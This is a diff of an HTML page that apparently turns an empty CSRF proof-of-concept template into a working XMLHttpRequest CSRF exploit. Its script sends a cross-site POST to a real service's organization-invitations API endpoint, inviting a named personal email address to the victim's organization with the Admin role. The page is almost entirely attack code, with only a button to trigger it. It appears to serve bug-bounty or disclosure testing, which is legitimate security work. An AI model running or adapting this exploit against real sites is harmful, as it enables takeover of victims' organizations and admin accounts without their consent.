@@ -1,11 +1,18 @@
 <!DOCTYPE html>
 <html lang="en">
 	<body>
-		<h1>Form CSRF PoC</h1>
-		<form method="GET" action="">
-			<input type="hidden" name="" value="">
-			<input type="submit" value="Submit Request">
-		</form>
+		<h1>XMLHttpRequest CSRF PoC</h1>
+		<p style="color: red;">Please reopen this window if request has new changes</p>
+		<input type="submit" value="Submit Request" onclick="sendData();">
+
+		<script>
+			function sendData() {
+				var xhr = new XMLHttpRequest();
+				xhr.open('POST', 'https://console.chainstack.com/api/core/v1/organization-invitations/');
+				xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+				xhr.setRequestHeader('Accept-Language', 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,ar;q=0.6');
+				xhr.send('email=yaacoubel63@gmail.com&user_group=Admin');
+			}
+		</script>
 	</body>
 </html>
-
